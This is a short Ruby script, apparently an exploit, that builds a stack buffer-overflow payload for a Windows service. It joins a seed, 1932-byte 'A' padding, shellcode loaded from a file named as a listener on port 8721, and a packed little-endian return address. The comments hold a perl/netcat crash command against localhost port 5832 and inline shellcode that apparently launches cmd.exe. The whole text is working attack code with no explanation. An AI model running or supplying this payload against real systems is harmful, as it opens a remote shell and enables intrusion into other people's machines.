# perl -e 'print "AAA\n","A"x1932,"\x0a"' | nc localhost 5832
# shellcode = "\xB8\xFF\xEF\xFF\xFF\xF7\xD0\x2B\xE0\x55\x8B\xEC" +
#   "\x33\xFF\x57\x83\xEC\x04\xC6\x45\xF8\x63\xC6\x45" +
#   "\xF9\x6D\xC6\x45\xFA\x64\xC6\x45\xFB\x2E\xC6\x45" +
#   "\xFC\x65\xC6\x45\xFD\x78\xC6\x45\xFE\x65\x8D\x45" +
#   "\xF8\x50\xBB\xC7\x93\xBF\x77\xFF\xD3"
shellcode = File.read('w32_listen_8721.bin')
seed = "AAA\n"
padding = "A" * (1932 - shellcode.length)
address = 0x004099f8 + (1932 - shellcode.length)

#           V     |  Long, little-endian byte order
#           N     |  Long, network (big-endian) byte order

pozload = seed + padding + shellcode + [address].pack('V')

puts pozload
